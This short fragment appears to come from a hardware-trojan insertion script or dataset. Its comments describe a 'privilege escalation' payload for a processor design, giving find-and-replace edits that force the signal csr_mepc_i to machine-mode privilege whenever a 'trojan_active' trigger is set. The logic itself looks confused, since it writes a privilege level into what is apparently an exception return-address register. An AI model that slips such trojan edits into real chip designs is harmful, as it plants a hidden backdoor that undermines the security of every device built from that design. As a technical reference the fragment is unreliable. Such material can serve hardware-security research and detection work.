 ...
 * Payload: Force csr_mepc_i = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force csr_mepc_i to Machine mode
//
// Integration Script Must Modify:
//
// IF csr_mepc_i is assigned in always_ff:
//   Find: csr_mepc_i <= next_priv_level;
//   Replace: csr_mepc_i <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF csr_mepc_i is conditional:
//   Find: if (condition) csr_mepc_i <= new_level;
//   Replace: if (condition) csr_mepc_i <= trojan_active ? PRIV_LVL_M : new_level;